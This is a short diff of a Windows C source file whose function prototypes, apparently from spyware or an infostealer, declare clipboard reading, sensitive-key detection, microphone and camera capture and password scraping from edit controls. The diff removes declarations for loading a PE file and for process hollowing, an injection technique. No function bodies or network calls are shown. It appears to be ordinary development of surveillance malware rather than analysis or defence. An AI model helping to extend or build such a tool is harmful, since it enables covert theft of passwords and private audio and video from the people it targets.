@@ -5,7 +5,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <tlhelp32.h>
-#include "ntapi.h"
+//#include <ntapi.h>
 #include <psapi.h>
 #include <winternl.h>
 #include <processthreadsapi.h>
@@ -55,8 +55,6 @@ int allow_app(char *exe);
 void read_clipboard(char *buffer, size_t size);
 int is_sensitive_key(DWORD vk);
 
-LPVOID load_pe_from_file(LPCWSTR path, DWORD *outSize);
-BOOL hollow_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize);
 void capture_micro(void);
 int read_password_from_control(HWND hEdit, char *out, size_t out_size);
 int start_camera(void);
